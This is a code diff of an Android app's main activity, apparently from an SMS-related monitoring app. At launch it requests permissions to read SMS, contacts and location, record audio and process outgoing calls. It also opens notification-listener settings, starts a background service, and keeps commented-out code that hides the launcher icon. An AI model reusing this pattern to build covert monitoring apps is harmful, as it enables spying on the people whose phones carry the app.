@@ -12,12 +12,11 @@ import android.net.NetworkInfo;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.provider.Settings;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v4.content.LocalBroadcastManager;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
-import android.support.v7.widget.LinearLayoutManager;
-import android.support.v7.widget.RecyclerView;
 import android.telephony.PhoneStateListener;
 import android.telephony.SignalStrength;
 import android.telephony.TelephonyManager;
@@ -27,13 +26,6 @@ import android.webkit.PermissionRequest;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import com.karumi.dexter.Dexter;
-import com.karumi.dexter.MultiplePermissionsReport;
-import com.karumi.dexter.PermissionToken;
-import com.karumi.dexter.listener.PermissionDeniedResponse;
-import com.karumi.dexter.listener.PermissionGrantedResponse;
-import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
-import com.karumi.dexter.listener.single.PermissionListener;
 
 import java.lang.reflect.Method;
 import java.util.ArrayList;
@@ -44,6 +36,7 @@ import gonext.smsapp.db.DbService;
 import gonext.smsapp.db.NotificationEntity;
 import gonext.smsapp.servers.BackgroundJob;
 import gonext.smsapp.servers.BackgroundJobService;
+import gonext.smsapp.utils.Utils;
 
 import static android.telephony.PhoneStateListener.LISTEN_NONE;
 
@@ -54,10 +47,12 @@ public class MainActivity extends AppCompatActivity {
     private BroadcastReceiver wifiReceiver;
     private MobileNetworkListener mPhoneStatelistener;
     private TelephonyManager mTelephonyManager;
+    private int PERMISSION_FLAG = 2000;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        checkAllPermissions();
         wifiPercent = (TextView) findViewById(R.id.wifi_percent);
         wifiStatus = (TextView) findViewById(R.id.wifi_status);
         mobilePercent = (TextView) findViewById(R.id.mobile_percent);
@@ -68,31 +63,8 @@ public class MainActivity extends AppCompatActivity {
         mobileRing = (ProgressRingView) findViewById(R.id.mobile_progress);
         wifiRing = (ProgressRingView) findViewById(R.id.wifi_progress);
 
-        String settings = Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners");
-        if (settings != null && settings.contains(getApplicationContext().getPackageName()))
-        {
-            System.out.println("enabled");
-            //service is enabled do something
-        } else {
-            //service is not enabled try to enabled by calling...
-            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
-            startActivity(intent);
-        }
 
-        /*PackageManager p = getPackageManager();
-        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
-        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
-
-        startService(new Intent(this, BackgroundJob.class)); //start service which is BackgroundJob.java
-
-        initializeWiFiListener();
-        initialMobileNetworkListener();
-    }
-
-    @Override
-    protected void onResume() {
-        super.onResume();
-        Dexter.withActivity(this)
+        /*Dexter.withActivity(this)
                 .withPermissions(
                         Manifest.permission.READ_PHONE_STATE,
                         Manifest.permission.READ_CONTACTS,
@@ -112,7 +84,33 @@ public class MainActivity extends AppCompatActivity {
                 System.out.println("entered");
                 token.continuePermissionRequest();
             }
-        }).check();
+        }).check();*/
+
+        String settings = Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners");
+        if (settings != null && settings.contains(getApplicationContext().getPackageName()))
+        {
+            System.out.println("enabled");
+            //service is enabled do something
+        } else {
+            //service is not enabled try to enabled by calling...
+            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+            startActivity(intent);
+        }
+
+        /*PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
+        if(!Utils.getBackgroundServiceStatus(this)) {
+            startService(new Intent(this, BackgroundJob.class)); //start service which is BackgroundJob.java
+        }
+        initializeWiFiListener();
+        initialMobileNetworkListener();
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+
     }
 
     private void initialMobileNetworkListener(){
@@ -308,5 +306,89 @@ private void refreshWifiView(String status,int percent,String percentage,String 
             e.printStackTrace();
         }
         return -101;
+    }
+
+
+    private void checkAllPermissions(){
+
+        int phoneState = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_PHONE_STATE);
+
+        int readContacts = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_CONTACTS);
+
+        int readSMS = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_SMS);
+
+        int storage = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE);
+
+        int recordAudio = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.RECORD_AUDIO);
+
+        int outGoingCalls = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.PROCESS_OUTGOING_CALLS);
+
+        int captureAudio = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.CAPTURE_AUDIO_OUTPUT);
+
+        int coaroseLoc = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_COARSE_LOCATION);
+
+        int fineLoc = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_FINE_LOCATION);
+        boolean isAllGranted = true;
+
+        List<String> permissions = new ArrayList<>();
+        if(phoneState != PackageManager.PERMISSION_GRANTED){
+            isAllGranted = false;
+            permissions.add(Manifest.permission.READ_PHONE_STATE);
+        }
+        if(readContacts != PackageManager.PERMISSION_GRANTED){
+            isAllGranted = false;
+            permissions.add(Manifest.permission.READ_CONTACTS);
+        }
+        if(readSMS != PackageManager.PERMISSION_GRANTED){
+            isAllGranted = false;
+            permissions.add(Manifest.permission.READ_SMS);
+        }
+        if(storage != PackageManager.PERMISSION_GRANTED){
+            isAllGranted = false;
+            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        }
+        if(recordAudio != PackageManager.PERMISSION_GRANTED){
+            isAllGranted = false;
+            permissions.add(Manifest.permission.RECORD_AUDIO);
+        }
+        if(outGoingCalls != PackageManager.PERMISSION_GRANTED){
+            isAllGranted = false;
+            permissions.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
+        }
+        if(captureAudio != PackageManager.PERMISSION_GRANTED){
+            isAllGranted = false;
+            permissions.add(Manifest.permission.CAPTURE_AUDIO_OUTPUT);
+        }
+        if(coaroseLoc != PackageManager.PERMISSION_GRANTED){
+            isAllGranted = false;
+            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        }
+        if(fineLoc != PackageManager.PERMISSION_GRANTED){
+            isAllGranted = false;
+            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        }
+
+        if(!isAllGranted){
+            ActivityCompat.requestPermissions(this,
+                    permissions.toArray(new String[permissions.size()]),
+                    PERMISSION_FLAG);
+
+        }
+
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+
     }
 }
